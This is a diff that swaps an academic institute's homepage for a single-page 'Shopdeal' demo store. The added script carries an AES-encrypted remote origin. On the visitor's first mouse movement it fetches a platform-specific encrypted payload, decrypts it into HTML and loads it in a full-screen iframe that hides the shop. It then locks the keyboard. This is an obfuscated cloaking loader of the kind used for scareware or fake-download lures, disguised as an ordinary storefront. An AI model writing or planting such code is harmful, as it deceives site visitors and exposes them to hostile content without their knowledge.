-      <div class="grid-2" style="align-items:center;">
-        <div>
-          <img src="assets/images/scholarly_symposium_hall.jpg" alt="Auditorium Filled with Scholars During Academic Keynote Address" class="showcase-image">
-        </div>
-        <div>
-          <span class="badge">Pedagogical Framework</span>
-          <h2 style="font-size:2.2rem;margin-bottom:1.25rem;">Active Socratic Colloquia & Annual Symposia</h2>
-          <p style="color:var(--text-muted);margin-bottom:1rem;line-height:1.7;">
-            Education at AcademyVision extends beyond traditional examination metrics. Our scholars engage in semester-long defense colloquia, presenting peer-reviewed theses before international visiting evaluation panels.
-          </p>
-          <p style="color:var(--text-muted);margin-bottom:1.5rem;line-height:1.7;">
-            Through the AcademyVision Annual Academic Symposium, over 1,200 international researchers converge on our campus to debate critical questions in climate policy, artificial cognition, and civic governance.
-          </p>
-          <a href="about.html" class="btn btn-outline">Review Institutional Mission</a>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- 8. Campus Visual Gallery -->
-  <section id="campus-gallery" class="section">
-    <div class="container">
-      <div class="section-header">
-        <span class="badge">Campus Life</span>
-        <h2>Architectural & Academic Living Environments</h2>
-        <p>A serene, inspiring physical sanctuary designed to cultivate contemplation, collaboration, and discovery.</p>
-      </div>
-      <div class="gallery-grid">
-        <div class="gallery-item">
-          <img src="assets/images/faculty_dean_keynote.jpg" alt="Dean Delivering Keynote in University Auditorium">
-        </div>
-        <div class="gallery-item">
-          <img src="assets/images/student_graduate_achievement.jpg" alt="Graduation Cap and Academic Honors at Convocation">
-        </div>
-        <div class="gallery-item">
-          <img src="assets/images/gallery_botanical_research_hall.jpg" alt="Botanical Glasshouse and Biological Research Facility">
-        </div>
-        <div class="gallery-item">
-          <img src="assets/images/gallery_student_union_commons.jpg" alt="University Scholars Engaging in Outdoor Quad Discussion">
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- 9. Scholarly Reviews & Alumni Fellowships -->
-  <section id="scholarly-reviews" class="section section-alt">
-    <div class="container">
-      <div class="section-header">
-        <span class="badge">Peer Accolades</span>
-        <h2>Reflections from Fellows & Alumni</h2>
-        <p>What distinguished postgraduates and faculty peers observe about AcademyVision.</p>
-      </div>
-      <div class="grid-3">
-        <div class="feature-card" style="padding:2rem;">
-          <div style="display:flex;align-items:center;gap:1rem;margin-bottom:1.25rem;">
-            <img src="assets/images/review_alumni_scholar.jpg" alt="Dr. Clara Montgomery" style="width:60px;height:60px;border-radius:50%;object-fit:cover;">
-            <div>
-              <h4 style="font-size:1.1rem;margin:0;">Dr. Clara Montgomery</h4>
-              <span style="font-size:0.85rem;color:var(--text-muted);">Postdoctoral Fellow, Max Planck Institute</span>
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
             </div>
-          </div>
-          <p style="font-style:italic;color:var(--text-muted);line-height:1.6;">
-            "The intellectual freedom and computational resources at AcademyVision fundamentally accelerated my doctoral dissertation. The cross-disciplinary seminars enabled me to view molecular thermodynamics through an entirely novel statistical lens."
-          </p>
-        </div>
-        <div class="feature-card" style="padding:2rem;">
-          <div style="display:flex;align-items:center;gap:1rem;margin-bottom:1.25rem;">
-            <img src="assets/images/author_dr_sarah_jenkins.jpg" alt="Dr. Sarah Jenkins" style="width:60px;height:60px;border-radius:50%;object-fit:cover;">
-            <div>
-              <h4 style="font-size:1.1rem;margin:0;">Dr. Sarah Jenkins</h4>
-              <span style="font-size:0.85rem;color:var(--text-muted);">Cognitive Pedagogy Investigator</span>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
-          </div>
-          <p style="font-style:italic;color:var(--text-muted);line-height:1.6;">
-            "Unlike traditional universities that operate in rigid departmental silos, AcademyVision actively incentivizes joint appointments and interfaculty research grants. It represents the future of academic scholarship."
-          </p>
-        </div>
-        <div class="feature-card" style="padding:2rem;">
-          <div style="display:flex;align-items:center;gap:1rem;margin-bottom:1.25rem;">
-            <img src="assets/images/author_dr_julian_thorne.jpg" alt="Dr. Julian Thorne" style="width:60px;height:60px;border-radius:50%;object-fit:cover;">
-            <div>
-              <h4 style="font-size:1.1rem;margin:0;">Dr. Julian Thorne</h4>
-              <span style="font-size:0.85rem;color:var(--text-muted);">Senior Academic Policy Advisor</span>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
             </div>
-          </div>
-          <p style="font-style:italic;color:var(--text-muted);line-height:1.6;">
-            "The rigor of the peer review culture and the uncompromising standard for empirical verification set AcademyVision apart. Scholars who train here go on to lead faculties across the world."
-          </p>
-        </div>
-      </div>
-    </div>
-  </section>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-  <!-- 10. Academic FAQ Accordion -->
-  <section id="academic-faq" class="section">
-    <div class="container">
-      <div class="section-header">
-        <span class="badge">Inquiries & Admissions</span>
-        <h2>Frequently Addressed Institutional Questions</h2>
-        <p>Essential details regarding our admissions process, scholarship funding, and academic governance.</p>
-      </div>
-      <div class="accordion">
-        <div class="accordion-item">
-          <button class="accordion-header">
-            <span>What are the primary criteria for doctoral and fellowship admissions?</span>
-            <span class="accordion-icon">+</span>
-          </button>
-          <div class="accordion-content">
-            <p>Admissions at AcademyVision are conducted through a comprehensive holistic review process. Candidates are evaluated based on their demonstrated research portfolio, letters of recommendation from recognized scholars, an original research proposal, and a formal oral colloquium defense with the admissions committee.</p>
-          </div>
-        </div>
-        <div class="accordion-item">
-          <button class="accordion-header">
-            <span>How does AcademyVision support independent doctoral research funding?</span>
-            <span class="accordion-icon">+</span>
-          </button>
-          <div class="accordion-content">
-            <p>Every accepted doctoral candidate receives a fully funded fellowship package for 4 to 5 years, encompassing complete tuition remission, a competitive living stipend, comprehensive health benefits, and a dedicated annual travel and laboratory grant of up to $8,500.</p>
-          </div>
-        </div>
-        <div class="accordion-item">
-          <button class="accordion-header">
-            <span>What institutional accreditations does AcademyVision maintain?</span>
-            <span class="accordion-icon">+</span>
-          </button>
-          <div class="accordion-content">
-            <p>AcademyVision operates under regional collegiate accreditation through the Higher Learning Commission (HLC) and maintains disciplinary accreditations through ABET (Engineering and Applied Science) and the International Academic Standards Council (IASC).</p>
-          </div>
-        </div>
-        <div class="accordion-item">
-          <button class="accordion-header">
-            <span>Can scholars pursue interdisciplinary joint-degree programs?</span>
-            <span class="accordion-icon">+</span>
-          </button>
-          <div class="accordion-content">
-            <p>Yes. Over 45% of our postgraduate candidates participate in concurrent joint-faculty programs, such as our Dual M.Sc. in Quantum Computing & Applied Epistemology or our Ph.D. in Computational Linguistics & Ethics.</p>
-          </div>
-        </div>
-        <div class="accordion-item">
-          <button class="accordion-header">
-            <span>How can external researchers access the AcademyVision Library Archives?</span>
-            <span class="accordion-icon">+</span>
-          </button>
-          <div class="accordion-content">
-            <p>Visiting research scholars may apply for a Visiting Scholar Access Grant, granting digital and physical reading room privileges. Our open-access institutional repository also hosts over 250,000 public monographs and research preprints.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-  <!-- 11. Admissions Convocation CTA -->
-  <section id="admissions-cta" class="section" style="background:linear-gradient(135deg, #0b2545 0%, #134074 100%);color:#ffffff;text-align:center;">
-    <div class="container">
-      <div style="max-width:760px;margin:0 auto;">
-        <span class="badge" style="background:rgba(255,255,255,0.15);color:#f1c40f;">Next Cohort Applications</span>
-        <h2 style="color:#ffffff;font-size:2.5rem;margin:1rem 0;">Embark on Your Academic Journey at AcademyVision</h2>
-        <p style="color:#cbd5e1;font-size:1.1rem;margin-bottom:2rem;">
-          Join a vibrant community of scholars, scientists, and visionaries dedicated to expanding the boundaries of human knowledge and pedagogical excellence.
-        </p>
-        <div style="display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;">
-          <a href="contact.html" class="btn btn-accent" style="font-size:1.05rem;padding:0.9rem 2.2rem;">Begin Fellowship Application</a>
-          <a href="about.html" class="btn btn-outline" style="color:#ffffff;border-color:rgba(255,255,255,0.4);">Learn More About Our Campus</a>
-        </div>
-      </div>
-    </div>
-  </section>
-</main>
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-<footer class="site-footer">
-  <div class="container">
-    <div class="footer-grid">
-      <div class="footer-col">
-        <div class="site-logo" style="color:#ffffff;margin-bottom:1rem;">
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 10v6M2 10l10-5 10 5-10 5z"/><path d="M6 12v5c3 3 9 3 12 0v-5"/></svg>
-          AcademyVision
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
         </div>
-        <p style="font-size:0.9rem;line-height:1.6;margin-bottom:1.25rem;">
-          Advancing intellectual frontiers, rigorous pedagogical methodologies, and interdisciplinary research. Dedicated to fostering scholarly excellence and global academic leadership.
-        </p>
-        <p style="font-size:0.85rem;color:#cbd5e1;">Official Inquiries: <a href="mailto:contact@academyvision.com" style="color:#ffffff;">contact@academyvision.com</a></p>
       </div>
-      <div class="footer-col">
-        <h4>Academic Pillars</h4>
-        <ul class="footer-links">
-          <li><a href="index.html#programs">STEM & Quantum Computing</a></li>
-          <li><a href="index.html#programs">Digital Humanities Archive</a></li>
-          <li><a href="index.html#programs">Educational Leadership</a></li>
-          <li><a href="index.html#research-centers">Interdisciplinary Labs</a></li>
-          <li><a href="about.html">Accreditation & Council</a></li>
-        </ul>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
       </div>
-      <div class="footer-col">
-        <h4>Scholarly Publications</h4>
-        <ul class="footer-links">
-          <li><a href="blog/index.html">Monograph Repository</a></li>
-          <li><a href="blog/learning-analytics-and-cognitive-load-in-higher-education-pedagogy.html">Learning Analytics</a></li>
-          <li><a href="blog/interdisciplinary-curriculum-design-and-faculty-silo-transcendence.html">Curriculum Silo Design</a></li>
-          <li><a href="blog/academic-peer-review-rigor-and-open-science-methodological-standards.html">Peer Review Standards</a></li>
-          <li><a href="blog/open-access-scholarly-commons-and-institutional-repository-governance.html">Open Access Commons</a></li>
-        </ul>
-      </div>
-      <div class="footer-col">
-        <h4>Institutional Policies</h4>
-        <ul class="footer-links">
-          <li><a href="privacy-policy.html">Privacy Policy</a></li>
-          <li><a href="terms-and-conditions.html">Terms & Conditions</a></li>
-          <li><a href="disclaimer.html">Academic Disclaimer</a></li>
-          <li><a href="cookie-policy.html">Cookie Policy</a></li>
-          <li><a href="contact.html">Academic Registry Office</a></li>
-        </ul>
-      </div>
-    </div>
-    <div class="footer-bottom">
-      <div>&copy; 2026 AcademyVision Institute for Higher Learning. All scholarly rights reserved.</div>
-      <div style="display:flex;gap:1.5rem;">
-        <a href="privacy-policy.html" style="color:#94a3b8;font-size:0.85rem;">Privacy</a>
-        <a href="terms-and-conditions.html" style="color:#94a3b8;font-size:0.85rem;">Terms</a>
-        <a href="disclaimer.html" style="color:#94a3b8;font-size:0.85rem;">Disclaimer</a>
-        <a href="cookie-policy.html" style="color:#94a3b8;font-size:0.85rem;">Cookies</a>
-      </div>
-    </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-</footer>
-<button class="back-to-top" aria-label="Back to Top">
-  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="m18 15-6-6-6 6"/></svg>
-</button>
-<script src="assets/js/main.js?v=2.1"></script>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18k+G0kjyj75mMlfCkTzeNC+gcXJAVHFELnXrHVMUxcQe75KNXpm1mT";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
